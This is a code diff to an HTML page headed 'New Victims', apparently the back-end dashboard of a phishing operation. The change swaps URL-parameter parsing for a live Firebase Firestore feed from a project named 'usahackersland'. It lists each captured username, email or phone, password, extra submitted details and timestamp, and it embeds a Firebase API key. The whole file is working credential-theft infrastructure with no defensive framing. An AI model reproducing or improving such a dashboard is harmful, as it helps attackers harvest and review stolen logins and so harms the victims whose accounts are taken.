@@ -6,104 +6,59 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
-  body{
-    font-family: Arial, sans-serif;
-    background:#0d1117;
-    color:#e6edf3;
-    padding:20px;
-  }
-  .card{
-    background:#161b22;
-    border-radius:8px;
-    padding:16px;
-    max-width:700px;
-    margin:auto;
-    box-shadow:0 0 10px rgba(0,0,0,0.4);
-  }
-  h2{
-    color:#ff4d4d;
-    margin-bottom:14px;
-  }
-  .item{
-    margin-bottom:14px;
-    padding-bottom:10px;
-    border-bottom:1px solid #30363d;
-  }
-  .label{
-    font-weight:bold;
-    color:#58a6ff;
-  }
-  .value{
-    margin-left:10px;
-    color:#c9d1d9;
-    word-break:break-word;
-  }
+  body{font-family: Arial, sans-serif;background:#0d1117;color:#e6edf3;padding:20px;}
+  .card{background:#161b22;border-radius:8px;padding:16px;max-width:700px;margin:auto;box-shadow:0 0 10px rgba(0,0,0,0.4);}
+  h2{color:#ff4d4d;margin-bottom:14px;}
+  .item{margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid #30363d;}
+  .label{font-weight:bold;color:#58a6ff;}
+  .value{margin-left:10px;color:#c9d1d9;word-break:break-word;}
 </style>
 </head>
 
 <body>
-
 <div class="card">
   <h2>🧨 New Victims</h2>
   <div id="output"></div>
 </div>
 
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 <script>
-const params = new URLSearchParams(window.location.search);
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 const output = document.getElementById("output");
 
-let username = "";
-let password = "";
-let extras = [];
-
-params.forEach((value, key) => {
-  const k = key.toLowerCase();
-
-  if (
-    k.includes("user") ||
-    k.includes("email") ||
-    k.includes("phone")
-  ) {
-    username = value;
-  }
-  else if (k.includes("pass")) {
-    password = value;
-  }
-  else {
-    extras.push({ key, value });
-  }
-});
-
-if (!params.toString()) {
-  output.innerHTML = "<p>No data received.</p>";
-} else {
-  let html = "";
-
-  html += `
-  <div class="item">
-    <div class="label">1. Email / Phone / Username</div>
-    <div class="value">${username || "—"}</div>
-  </div>`;
-
-  html += `
-  <div class="item">
-    <div class="label">2. Password</div>
-    <div class="value">${password || "—"}</div>
-  </div>`;
-
-  html += `
-  <div class="item">
-    <div class="label">3. Extra Submitted Details</div>
-    <div class="value">
-      ${extras.length
-        ? extras.map(e => `${e.key}: ${e.value}`).join("<br>")
-        : "—"}
-    </div>
-  </div>`;
-
-  output.innerHTML = html;
-}
+db.collection("submissions")
+  .orderBy("timestamp","desc")
+  .onSnapshot(snapshot=>{
+    output.innerHTML="";
+    snapshot.forEach(doc=>{
+      const data=doc.data();
+      let html=`
+      <div class="item">
+        <div class="label">1. Username / Email / Phone</div>
+        <div class="value">${data.username || "—"}</div>
+      </div>
+      <div class="item">
+        <div class="label">2. Password</div>
+        <div class="value">${data.password || "—"}</div>
+      </div>
+      <div class="item">
+        <div class="label">3. Extra Submitted Details</div>
+        <div class="value">${data.extras.map(e=>`${e.key}: ${e.value}`).join("<br>") || "—"}</div>
+      </div>
+      <div class="item">
+        <div class="label">4. Date</div>
+        <div class="value">${data.timestamp?.toDate().toLocaleString() || "—"}</div>
+      </div>`;
+      output.innerHTML+=html;
+    });
+  });
 </script>
-
 </body>
 </html>
